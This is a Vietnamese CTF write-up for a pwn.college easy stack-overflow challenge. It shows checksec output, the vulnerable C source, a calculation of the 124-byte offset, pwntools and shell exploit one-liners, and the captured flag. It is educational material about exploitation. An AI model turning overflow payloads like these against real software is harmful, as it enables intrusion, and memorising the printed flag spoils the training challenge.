## 📌 [Viettel Training Program] - Your First Overflow (easy)

- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Easy
- **Points:** —
- **Description:** Overflow buffer trên stack để ghi đè biến `win_variable`. Khi biến này khác 0, chương trình gọi `win()` và in flag từ `/flag`.

## 1. Khảo sát Ban đầu (Mitigation Check)

> Bước này giúp xác định các "lớp giáp" của file binary để biết phương pháp tấn công nào khả thi.

```bash
$ checksec ./binary-exploitation-first-overflow-w
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

**Nhận xét nhanh:**

- **Không có Stack Canary** → Có thể overflow stack mà không cần leak/bypass canary.
- **NX enabled** → Không cần shellcode trên stack; bài này không gọi shellcode mà chỉ ghi đè biến cục bộ.
- **PIE disabled** → Địa chỉ code cố định (hữu ích nếu sau này cần ROP, nhưng bài easy không cần).
- Mục tiêu tấn công: **stack buffer overflow** để set `win_variable ≠ 0`, không cần điều khiển `RIP`.

## 2. Phân tích Tĩnh & Động (Reversing & Analysis)

### Phân tích mã nguồn

Hàm `challenge()` khai báo struct cục bộ và đọc input không an toàn:

```c
struct {
    char input[122];
    int win_variable;
} data = {0};

unsigned long size = 4096;
// ...
int received = read(0, &data.input, (unsigned long) size);

if (data.win_variable) {
    win();
}
```

**Lỗi:** `read()` cho phép ghi tối đa **4096 byte** vào buffer chỉ **122 byte** → tràn stack, ghi đè các biến phía trên buffer (gồm `win_variable`).

Hàm `win()` mở `/flag` và in nội dung:

```c
void win() {
    flag_fd = open("/flag", 0);
    flag_length = read(flag_fd, flag, sizeof(flag));
    write(1, flag, flag_length);
}
```

Chương trình còn in sẵn offset tới `win_variable` khi chạy:

```c
printf("The \"win\" variable is stored at %p, %d bytes after the start of your input buffer.\n",
       &data.win_variable,
       ((unsigned long) &data.win_variable) - ((unsigned long) &data.input));
```

### Tính offset

Trên **amd64** (GCC), struct có padding 2 byte sau `input[122]` để căn `int`:

| Thành phần      | Offset (byte) |
|-----------------|---------------|
| `input[122]`    | 0 – 121       |
| padding         | 122 – 123     |
| `win_variable`  | **124**       |

=> **Offset tới `win_variable` = 124 bytes** (có thể xác nhận bằng output khi chạy binary).

### Phân tích động (tùy chọn)

Chạy binary, quan sát dump stack trước/sau khi gửi payload. Sau khi gửi đủ 124 byte `'A'` + 4 byte giá trị khác 0, output sẽ báo `win_variable` khác `0x0` và gọi `win()`.

## 3. Ý tưởng Tấn công (Exploit Strategy)

Đây là bài **variable overwrite** cơ bản, không cần ROP hay ret2libc:

1. Gửi **124 byte** padding (ví dụ `'A'`) để lấp đầy `input` và padding.
2. Ghi thêm **4 byte** (little-endian) khác 0 vào `win_variable` (ví dụ `0x00000001`).
3. Hàm `challenge()` kiểm tra `if (data.win_variable)` → gọi `win()` → đọc và in flag.

> Không cần ghi đè return address hay bypass canary — chỉ cần tràn vừa đủ tới `win_variable`.

## 4. Mã Khai thác (Exploit Script)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "info"

# exe = ELF("./binary-exploitation-first-overflow-w")
# r = process("./binary-exploitation-first-overflow-w")
r = remote("HOST", PORT)  # thay HOST/PORT khi deploy remote

OFFSET = 124  # khoảng cách từ đầu input tới win_variable (amd64 + GCC)

payload = flat({
    OFFSET: p32(1),  # win_variable = 1 (bất kỳ giá trị != 0)
})

r.sendafter(b"Send your payload", payload)

r.interactive()  # nhận flag / tương tác shell nếu có
```

Payload tối thiểu bằng `pwntools` one-liner:

```python
from pwn import *
r = process("./binary-exploitation-first-overflow-w")
r.sendlineafter(b"Send your payload", b"A" * 124 + p32(1))
r.interactive()
```

Hoặc dùng `echo` / `printf` (local):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*124 + b"\x01\x00\x00\x00")' | ./binary-exploitation-first-overflow-w
```

## 5. Kết quả & Flag

Chạy exploit thành công:

```text
You win! Here is your flag:
pwn.college{wtUL_h8eWDrs51H0dem9hFMz3-1.dlDOywSMzgjNwEzW}

Goodbye!
```

**Lessons Learned (Bài học rút ra):**

- Stack buffer overflow không nhất thiết phải chiếm shell — đôi khi chỉ cần ghi đè **biến cục bộ** (control-flow nhẹ) để kích hoạt hàm `win()`.
- Luôn xác định **offset** chính xác (struct layout, padding, hoặc output debug của challenge).
- `read()` với `size` lớn hơn buffer là lỗi phổ biến trong bài pwn entry-level; mitigations (canary, PIE, NX) quyết định bước khai thác tiếp theo ở bài khó hơn.
